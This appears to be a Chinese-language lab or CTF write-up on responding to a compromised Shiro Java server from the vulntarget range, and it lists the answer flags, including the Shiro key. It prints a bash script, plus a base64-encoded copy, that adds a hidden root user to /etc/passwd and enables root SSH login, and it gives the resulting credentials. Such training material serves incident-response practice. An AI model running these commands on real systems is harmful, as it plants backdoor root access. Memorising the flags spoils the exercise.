# 第八章-内存马分析-Java02-Shiro

  
  
&lt;!--more--&gt;  
## 0x00 环境分析  
```  
靶机来源 @vulntarget  
靶机可以采集本地搭建或者是云端调度  
搭建链接 https://github.com/crow821/vulntarget  
    本题不提供靶机账户密码请根据nacos 获取的shirokey 攻击靶机后登录应急  
```  
## 0x01  
利用上一题获取的`shiro key`攻击后进行应急  
1、将 shiro 的 key 作为 flag 提交  
`flag{KduO0i&#43;zUIMcNNJnsZwU9Q==}`  
2、隐藏用户后删除，并将隐藏用户名作为 flag 提交  
`8088`运行着`Shiro`服务  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406081527792.png)
`cat /etc/passwd`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406081528896.png)
`flag{guest}`  
3、分析app.jar文件是否存在后门，并把后门路由名称作为 flag 提交  
添加一个用户利用`ssh`进行连接  
```bash  
#!/bin/bash  
  
echo &#34;system:adk6oNRwypFwA:0:0:eval_to_root:/root:/bin/bash&#34; &gt;&gt; /etc/passwd &amp;&amp; echo &#34;PermitRootLogin yes&#34; &gt;&gt; /etc/ssh/sshd_config &amp;&amp; /etc/init.d/ssh restart  
```  
`echo IyEvYmluL2Jhc2gKCmVjaG8gInN5c3RlbTphZGs2b05Sd3lwRndBOjA6MDpldmFsX3RvX3Jvb3Q6L3Jvb3Q6L2Jpbi9iYXNoIiA&#43;PiAvZXRjL3Bhc3N3ZCAmJiBlY2hvICJQZXJtaXRSb290TG9naW4geWVzIiA&#43;PiAvZXRjL3NzaC9zc2hkX2NvbmZpZyAmJiAvZXRjL2luaXQuZC9zc2ggcmVzdGFydA==|base64 -d &gt; /tmp/ssh.sh`  
连接`ssh system/admin123`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406081755054.png)
`flag{/exec}`  
4、分析app.jar文件，将后门的密码作为 flag 提交  
`flag{cmd}`  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-java02-shiro/  

